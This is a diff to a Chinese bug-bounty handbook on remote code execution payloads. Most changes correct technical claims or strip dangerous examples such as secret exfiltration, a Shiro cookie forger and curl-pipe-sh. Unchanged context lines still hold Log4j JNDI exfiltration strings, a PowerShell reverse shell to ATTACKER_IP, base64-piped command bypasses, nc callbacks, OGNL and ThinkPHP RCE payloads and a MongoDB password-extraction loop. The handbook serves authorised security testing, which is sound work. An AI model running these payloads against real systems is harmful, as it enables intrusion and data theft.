@@ -7,8 +7,8 @@
 
 ## 1. 一句话说清
 
-RCE = 在目标服务器上执行任意命令。
-SRC 价值：**所有漏洞类型中最高**，未授权 RCE 通常 $5k–$50k+。
+RCE = 远程触发目标运行攻击者控制的代码；操作系统命令执行是其中一种结果。
+SRC 严重性与奖励取决于真实权限、隔离边界、业务影响和项目规则，没有统一最高等级或保底奖金。
 两条路：(a) 命令注入（拼接系统命令）；(b) 反序列化 / 表达式注入（运行时 evaluate）。
 
 ---
@@ -47,13 +47,14 @@ SRC 价值：**所有漏洞类型中最高**，未授权 RCE 通常 $5k–$50k+�
 ```
 # Java
 Cookie / Authorization 含 base64 二进制（rO0AB 开头 = Java 序列化）
-ViewState（ASP.NET）
-__viewstate / __eventvalidation
+
+# .NET（不是 Java 序列化）
+ViewState（ASP.NET）；格式、MAC 和加密配置另行判断
 sessionid 含 Java 序列化数据
 
 # PHP
 unserialize() 接受用户输入（O:8: 开头）
-phar:// 协议触发自动反序列化
+phar:// 旧版 PHP 可能自动反序列化元数据；PHP 8.0 起不再自动触发
 
 # Python
 pickle.loads() 接受用户输入
@@ -123,7 +124,7 @@ ${${lower:j}ndi:${lower:l}dap://x.dnslog.cn/a}
 ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//x.dnslog.cn/a}
 
 # 带数据外带
-${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.x.dnslog.cn/a}
+${jndi:ldap://TEST_CANARY.OWNED_CALLBACK_DOMAIN/a}  # 不读取真实密钥
 ${jndi:ldap://${sys:java.version}.x.dnslog.cn/a}
 ${jndi:ldap://${env:USER}.x.dnslog.cn/a}
 ```
@@ -143,7 +144,8 @@ ${jndi:ldap://${env:USER}.x.dnslog.cn/a}
 ```bash
 # Java（ysoserial）
 java -jar ysoserial-all.jar URLDNS "http://xxx.dnslog.cn"
-# 把生成的 base64 放到 Cookie / ViewState / Authorization
+# ysoserial 默认输出原始二进制；仅在已确认接收 Java 序列化且传输约定要求时 Base64 编码。
+# ASP.NET ViewState 不是 Java 序列化入口。
 
 # 验证 Java 序列化
 echo "input" | base64 -d | xxd | head -1  # security-allowlist: SEC008
@@ -189,7 +191,7 @@ Content-Type: application/x-www-form-urlencoded
 class.module.classLoader.resources.context.parent.pipeline.first.pattern=test
 ```
 
-200 + 不报错 = 可能存在；进一步配合 Tomcat AccessLogValve 写 webshell。
+HTTP 200 或没有报错都不是漏洞证据。此参数可能修改日志 pattern，并非只读探针；仅在隔离环境和变更授权下验证并恢复，不能据此宣称 RCE。
 
 ### 3.7 OGNL（Struts2）探针
 
@@ -223,7 +225,7 @@ Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEM
 | `cat` 关键字 | `c'a't`、`c\at`、`tac`、`/bin/c?t`、`/???/??t` |
 | `;` `\|` | `%0a`、`%0d`、`&&`、`\|\|`、`` ` `` |
 | 命令字过滤 | base64：`echo Y2F0IC9ldGMvcGFzc3dk \| base64 -d \| sh` | <!-- security-allowlist: SEC008 -->
-| 出网拦截 | DNS 外带（53 几乎不拦） |
+| 出网拦截 | DNS 外带（仍受出网策略限制，且回调不等于 RCE） |
 | 关键字 `jndi` | `${${lower:j}ndi:...}`、`${${::-j}ndi:...}` |
 | 长度限制 | 短链 / shorthand 域名 / `id\|nc x.cc 80` |
 
@@ -259,7 +261,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_
 
 ### 5.2 SRC 测试**不要**反弹 shell
 
-仅做以下"无副作用"证明：
+经项目明确允许后仅做最小证明；命令、外带和文件读取仍会产生审计记录并可能泄露信息：
 
 ```bash
 # 验证执行
@@ -303,9 +305,9 @@ cat /etc/issue
 | 项目 | 值 |
 |------|---|
 | 影响版本 | Log4j 2.0 – 2.14.1 |
-| 修复版本 | 2.17.0+（2.15 / 2.16 仍有绕过） |
+| 修复版本 | 按具体 CVE、Java 分支和 Apache 官方安全公告选择受支持修复版本；2.17.0 不是全部 Log4j 问题的通用安全下限 |
 | 黑盒指纹 | 任何被记录的输入点都可能触发 |
-| 探针 | `${jndi:dns://x.dnslog.cn/a}`，DNSLog 收到 = 命中 |
+| 探针 | `${jndi:dns://x.dnslog.cn/a}`，DNS 回调仅证明相关网络查询，需要关联目标日志和独立执行证据 |
 | CVSS | 10.0 Critical |
 
 ### 6.2 Spring4Shell (CVE-2022-22965)
@@ -321,7 +323,7 @@ cat /etc/issue
 | CVE | 版本 | 关键 |
 |-----|------|------|
 | CVE-2017-18349 | < 1.2.25 | `@type` 直接利用 |
-| CVE-2019-12384 | 1.2.25–1.2.47 | 缓存绕过 |
+| 非该 CVE | 历史 1.2.47 链 | CVE-2019-12384 属于 jackson-databind，不能作为 Fastjson 版本依据 |
 | - | 1.2.48–1.2.67 | 各种 gadget |
 | - | 1.2.68–1.2.80 | expectClass 绕过 |
 | - | < 1.2.83 | 仍有风险 |
@@ -341,7 +343,7 @@ DNSLog 收到 = 至少 Fastjson 解析了 `@type`，进一步用 1.2.47 绕过�
 
 ### 6.4 Struts2 系列
 
-| CVE | 版本 | 触发 |
+| Struts 安全公告 ID（非 CVE） | 历史版本范围（需查公告） | 触发 |
 |-----|------|------|
 | S2-001 | 2.0.0–2.0.8 | OGNL 直接 |
 | S2-005 | 2.0.0–2.1.8.1 | `('#'+a)(...)`  |
@@ -397,7 +399,7 @@ POST /_search
 |------|-----|------|
 | 5.0.0–5.0.23 | CVE-2018-20062 | `?s=captcha` + `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id` |
 | 5.1.x | - | 反序列化 |
-| 6.0.x | CVE-2022-38627 | 多语言 RCE |
+| 6.0.x | 非 ThinkPHP CVE（CVE-2022-38627 属于 Nortek eMerge SQL 注入） | 多语言 RCE |
 
 ### 6.9 Jenkins Script Console
 
@@ -550,6 +552,24 @@ _共 385 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 
 
 
 ## Payload 库
+
+### 示例解释与已知限制
+
+以下是历史语法摘录，不是逐条验证过的可执行 exploit。只在自有隔离环境验证；生产报告应停在项目允许的最小 canary，不默认持久化、读取密钥、公开发包或横向移动。
+
+- JNDI/URLDNS/Fastjson 的 DNS 回调只能证明查询发生；不能确定产品版本、gadget 可用或任意代码执行。Log4j 需核对 log4j-core、版本、JDK 和配置，不能将所有 2.x 视为受影响。
+- Actuator 暴露不等于可写 env/restart、H2 SQL 执行或 RCE；现代端点可脱敏并有独立授权。路由创建/刷新、日志写入、heapdump 下载都会改变状态或暴露秘密，须单独授权和恢复。
+- 原 Fastjson “Unicode/十六进制” 两个块实际上都是未编码 JSON；JSON 不支持通用 `\xNN` 转义。SpEL 中 `Run"+"time` 不能拼接类型/方法标识符；相关变体不能直接执行。Java Runtime.exec(String) 不自动调用 shell，所以管道/重定向与花括号展开并非通用有效。
+- T3 `sock.send(payload)` 省略协议封装，不是完整实现；安装 idna 不会实现 IIOP。出现的本地 exploit 脚本和外部 JAR 不是本技能附件，参数/来源须独立核对，不要编译运行未审查下载物。
+- PHP 8 不再执行 assert 字符串、create_function 已移除，preg_replace /e 早已移除；eval 不能作为变量函数调用。未加引号的数组键在现代 PHP 会报错。Phar 路径本身不保证元数据反序列化，更不保证 RCE；PHP 8.0 改变了自动反序列化行为。
+- PHP filter 示例不是完整生成链：data URI 示例格式/重复解码不能当可运行证明；图像尾部 PHP 只有进入 PHP 解释器才执行。上传扩展名、NUL 截断、.htaccess handler、auto_prepend_file 都取决于历史版本/AllowOverride/PHP 集成方式。safe_mode 在 PHP 5.4 已移除，display_errors 不是禁用安全限制。
+- Jinja2 和 Twig 是不同语言；Python 3 字符串 MRO 无索引 2，固定 subclasses()[40] 不可靠。config/request 取决于宿主暴露的变量。FreeMarker ?new 要求 TemplateModel，不能实例化 Runtime；ObjectConstructor 不是调用 Runtime.getRuntime 的工具，且 ?new 与 ?api 是不同机制。这些块中的相关命令不是有效通用链。
+- Velocity 的 $class/$Class/$sys、Pug 的 require/global.require/mainModule 都依赖宿主上下文；ClassTool inspect 也不是直接 Java Class。Django 模板不支持 {{7*7}}、if 1=1 或下划线属性链，settings 默认不注入；不能把普通模板渲染等同 RCE。Flask Cookie 需其 session serializer 的 salt/参数，普通 URLSafeTimedSerializer 不等价；调试器 PIN 还依赖版本与 machine-id 等信息。
+- XXE 的 UTF-16 声明必须与实际字节一致；CDATA 不展开实体。带文件内容的 URL 可能因换行/非法字符失败；固定 `filecontent` 子域不携带文件内容。Redis 6379 不讲 HTTP。内嵌 DTD 参数实体展开与外部 DTD 规则不同；OOXML 的占位命名空间/缺失 w:body 会破坏文档，须保留有效原结构。
+- pull_request_target 的危险来自既有特权工作流取出并执行不可信 PR 代码；PR 新增该工作流本身不会直接替换默认分支工作流。workflow_dispatch 也不自动绕过权限。生命周期示例 index.js 在安装时不会自动运行，除非有显式 hook/其他导入；公开包发布会影响第三方，不能作为默认检测步骤。
+- 原型污染必须证明实际继承属性传播与版本特定 sink；JSON 字段回显或修改自己的对象不够。$where=true 不会取消其他 MongoDB 查询约束，继承属性不保证会被驱动序列化，$eq:{$ne:...} 也不是等价认证绕过。Puppeteer setter 探针可能被自有属性遮蔽而漏检；测试后销毁隔离上下文。
+
+资料核对：[PHP 8 迁移](https://www.php.net/manual/en/migration80.incompatible.php)、[Django 安全公告](https://docs.djangoproject.com/en/6.0/releases/security/)、[Apache Logging 安全](https://logging.apache.org/security.html)、[FreeMarker ?new](https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new)。
 
 _55 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_
 
@@ -1511,7 +1531,7 @@ _APP_KEY利用_
 # 解密加密数据
 
 # 使用工具解密
-php artisan decrypt <encrypted_value>
+# Laravel 没有通用内置 artisan decrypt 命令；需应用自己的解密入口/已确认版本 API
 
 # 伪造管理员Cookie
 # 需要了解应用加密方式
@@ -1570,20 +1590,9 @@ java -jar ysoserial.jar CommonsCollections2 "id" > payload.ser
 import base64
 from Crypto.Cipher import AES
 
-def encode_rememberme(command):
-    # 生成payload
-    payload = os.popen(f"java -jar ysoserial.jar CommonsCollections2 \"{command}\"").read()
-    
-    # AES加密
-    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
-    cipher = AES.new(key, AES.MODE_CBC, iv=key)
-    
-    # PKCS5Padding
-    pad = 16 - len(payload) % 16
-    payload += bytes([pad]) * pad
-    
-    encrypted = cipher.encrypt(payload)
-    return base64.b64encode(encrypted).decode()
+# 原生成器把二进制当文本、混合 str/bytes，缺少 os 导入且没有附加 IV，不能生成有效 Cookie。
+# Shiro 历史 CBC Cookie 的 IV/密文布局和实际密钥必须按目标版本源码核对。
+# 本文不提供未经验证的替代生成器；rememberMe=deleteMe 只是候选指纹，不证明已知密钥或可利用 gadget。
 ```
 
 **3. 3. 发送恶意请求**
@@ -1842,17 +1851,8 @@ Django框架安全漏洞
 **1. 1. SQL注入**
 _CVE-2020-7471 SQL注入_
 ```
-# CVE-2020-7471
-# 通过PostgreSQL输入验证绕过
-# 使用JSONField/HStoreField
-
-# 构造恶意查询
-Model.objects.filter(data__contains={"key": "value; SELECT SLEEP(5);--"})
-
-# 或使用ArrayField
-Model.objects.filter(tags__contains=["tag'); SELECT SLEEP(5);--"])
-
-# 触发SQL注入
+# CVE-2020-7471 是 StringAgg(delimiter) SQL 注入；普通 JSONField/ArrayField contains 不是该 CVE 的复现。
+# 按 Django 官方历史公告核对受影响版本和实际 StringAgg 调用；不把普通参数值当 SQL 执行证明。
 ```
 
 **2. 2. 调试模式信息泄露**
@@ -1878,7 +1878,7 @@ _SECRET_KEY利用_
 # 获取SECRET_KEY后
 # 可以:
 # 1. 签名伪造Session
-# 2. 签名伪造CSRF Token
+# Django CSRF token 并非由 SECRET_KEY 签名，泄露此 key 不自动伪造 CSRF token
 # 3. 密码重置Token
 
 # 使用django-session-cleanup工具
@@ -1896,8 +1896,7 @@ fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)
 **4. 4. 路径遍历**
 _路径遍历漏洞_
 ```
-# CVE-2021-28658
-# Django静态文件路径遍历
+# CVE-2021-28658 是上传文件路径遍历，不是以下 static GET 示例；以下仅为另一个待证实的应用路径测试。
 GET /static/../../../../etc/passwd
 
 # 使用工具检测
@@ -2472,7 +2471,7 @@ class Exploit {
 }
 echo serialize(new Exploit());
 ?>
-生成: O:6:"Exploit":1:{s:3:"cmd";s:17:"system('whoami');";}
+生成: O:7:"Exploit":1:{s:3:"cmd";s:17:"system('whoami');";}
 ```
 
 **3. 3. Python反序列化**
@@ -2586,8 +2585,8 @@ _属性修饰符处理_
 使用public/private/protected属性
 注意序列化格式差异:
 public: s:3:"cmd"
-private: s:8:"\0Class\0cmd"
-protected: s:7:"\0*\0cmd"
+private: s:10:"\0Class\0cmd"
+protected: s:6:"\0*\0cmd"
 ```
 
 ---
@@ -3036,7 +3035,7 @@ _使用字符串拼接绕过_
 ```
 {{''['__cla'+'ss__']}}
 {{''|attr('__cla'+'ss__')}}
-{{''|attr('\x5f\x5fcla\x5f\x5fss')}}
+{# 原编码得到 __cla__ss 而非 __class__，不是有效属性名。 #}
 ```
 
 **2. 使用request对象**
@@ -3615,7 +3614,7 @@ _使用system/exec执行命令并获取反弹Shell_
 **1. 字符串拼接**
 _使用字符串拼接绕过_
 ```
-<%= `i` + `d` %>
+<%# `i` + `d` 执行两个独立命令，不会拼接成 id；不是有效等价变体。 %>
 <%= system("wh"+"oami") %>
 <%= ("i"+"d").then { |c| system(c) } %>
 ```
@@ -3904,6 +3903,7 @@ _CDATA包装_
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <foo><![CDATA[&xxe;]]></foo>
+<!-- CDATA 中实体引用不会展开；这个例子输出字面 &xxe;，不读取文件。 -->
 ```
 
 ---
@@ -4309,7 +4309,7 @@ _利用延迟执行、代码混淆和环境检测绕过自动化安全扫描_
 # 延迟执行避开沙箱检测
 setTimeout(() => {
   // 恶意代码在30秒后执行，绕过自动化分析超时
-  require('child_process').exec('curl evil.com/c | sh')  # security-allowlist: curl-pipe-bash
+  console.log('isolated delayed lifecycle canary');
 }, 30000);
 
 # 代码混淆
@@ -4466,11 +4466,11 @@ cat > index.js << 'EOF'
 const os = require("os");
 const dns = require("dns");
 const pkg = require("./package.json");
-// 仅DNS回调确认安装——无数据外泄
-dns.resolve(`${pkg.name}.${os.hostname()}.dep-test.example.com`, ()=>{});
+// 该原示例会发送 hostname；这也是环境数据外泄。演示仅使用固定测试 canary。
+dns.resolve("fixed-test-canary.dep-test.example.com", ()=>{});
 EOF
 
-npm publish --access public
+# 不向公共注册表发布演示包；在自有隔离私有 registry 中验证解析。
 ```
 
 **3. 3. 监控DNS回调确认命中**
@@ -4492,7 +4492,7 @@ python3 -m http.server 8080 &
 _验证包管理器的解析优先级行为并评估影响范围_
 ```
 # 验证受影响的包管理器行为
-# NPM: 默认优先公共高版本
+# 此命令显式指定公共 registry，只验证该 registry，不证明 npm 会合并公私源优先选最高版本
 npm install @target-corp/utils --registry https://registry.npmjs.org -dd 2>&1 | grep "resolved"
 
 # Python/pip同理
@@ -4516,7 +4516,7 @@ pip install target-internal-lib  # pip没有scope概念
 
 # 使用prerelease标签
 npm version 99.0.0-alpha.1
-# 某些配置会匹配 >=1.0.0 范围包括prerelease
+# node-semver 默认不把 prerelease 纳入普通范围；需显式 prerelease 条件或 includePrerelease 等配置
 ```
 
 ---
@@ -4770,15 +4770,16 @@ _使用$regex盲注逐字符提取MongoDB中存储的密码_
 # 利用$regex逐字符提取管理员密码
 import requests
 import string
+import re
 
 url = "https://{TARGET}/api/login"
 password = ""
 chars = string.ascii_letters + string.digits + string.punctuation
 
-for i in range(32):
+for i in range(1):  # 仅自有合成测试值，一次有限探测
     for c in chars:
         payload = {
-            "username": "admin",
+            "username": "OWNED_SYNTHETIC_TEST_USER",
             "password": {"$regex": f"^{password}{re.escape(c)}"}
         }
         r = requests.post(url, json=payload)
@@ -4799,7 +4800,7 @@ curl -X POST "https://{TARGET}/api/search" \
   -d '{"$where": "function(){return this.role==\"admin\"}"}'
 
 # 利用已获取的认证绕过导出数据
-curl -s "https://{TARGET}/api/users?limit=1000" \
+curl -s "https://{TARGET}/api/users?limit=1" \
   -H "Authorization: Bearer {ADMIN_TOKEN}" | jq '.[].email'
 
 # 检查MongoDB REST接口(如果暴露)
